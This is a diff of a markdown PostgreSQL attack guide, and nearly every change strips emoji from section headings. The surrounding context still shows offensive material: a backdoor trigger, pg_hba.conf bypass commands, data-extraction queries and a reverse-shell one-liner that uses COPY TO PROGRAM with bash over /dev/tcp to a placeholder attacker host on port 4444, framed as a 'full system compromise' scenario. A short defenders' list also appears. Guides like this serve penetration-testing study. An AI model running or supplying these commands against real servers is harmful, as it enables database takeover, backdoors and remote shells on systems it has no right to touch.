@@ -1,6 +1,6 @@
 # Port 5432 - PostgreSQL - Complete Attack Guide
 
-## 📖 Overview
+## Overview
 
 **Protocol**: PostgreSQL Database
 **Port**: 5432 (default)
@@ -8,7 +8,7 @@
 **Encryption**: Optional (SSL/TLS)
 **Authentication**: Password, MD5, SCRAM-SHA-256, Certificate, GSSAPI
 
-## 🎯 Attack Objectives
+## Attack Objectives
 
 - **Credential Brute Force**: Crack database credentials
 - **Command Execution**: Execute OS commands via extensions
@@ -17,7 +17,7 @@
 - **Privilege Escalation**: Gain superuser access
 - **Code Execution**: Via procedural languages (PL/pgSQL, PL/Python)
 
-## 🔍 Attack Methodology
+## Attack Methodology
 
 ### Phase 1: Discovery and Reconnaissance
 
@@ -369,7 +369,7 @@ CREATE TRIGGER backdoor_trig AFTER INSERT ON some_table
 FOR EACH ROW EXECUTE FUNCTION backdoor_trigger();
 ```
 
-## 🛡️ Bypass Techniques
+## Bypass Techniques
 
 ### Bypassing pg_hba.conf Restrictions
 ```bash
@@ -393,7 +393,7 @@ psql "sslmode=require host=192.168.1.100 user=postgres dbname=postgres"
 psql "sslmode=allow host=192.168.1.100 user=postgres"
 ```
 
-## 📊 Information Extraction
+## Information Extraction
 
 **Critical Queries**:
 ```sql
@@ -419,7 +419,7 @@ SELECT pg_database_size(current_database());
 SELECT * FROM pg_stat_activity;
 ```
 
-## 🔐 Security Recommendations
+## Security Recommendations
 
 **For Defenders**:
 1. **Strong Passwords** - Complex passwords for all users
@@ -433,7 +433,7 @@ SELECT * FROM pg_stat_activity;
 9. **Update PostgreSQL** - Patch known vulnerabilities
 10. **Network Segmentation** - Firewall PostgreSQL access
 
-## 🎯 Practical Attack Scenario
+## Practical Attack Scenario
 
 ```bash
 # Discovery
@@ -470,7 +470,7 @@ COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
 # Full system compromise
 ```
 
-## 📚 Tools Summary
+## Tools Summary
 
 **Best Tool for Each Task**:
 - **Discovery**: Nmap
@@ -479,7 +479,7 @@ COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/attacker/4444 0>&1"';
 - **Exploitation**: psql (COPY TO PROGRAM)
 - **Hash Cracking**: Hashcat
 
-## 🔗 Related Attacks
+## Related Attacks
 
 - **Port 3306 (MySQL)**: Similar database attacks
 - **Port 1433 (MSSQL)**: Similar command execution
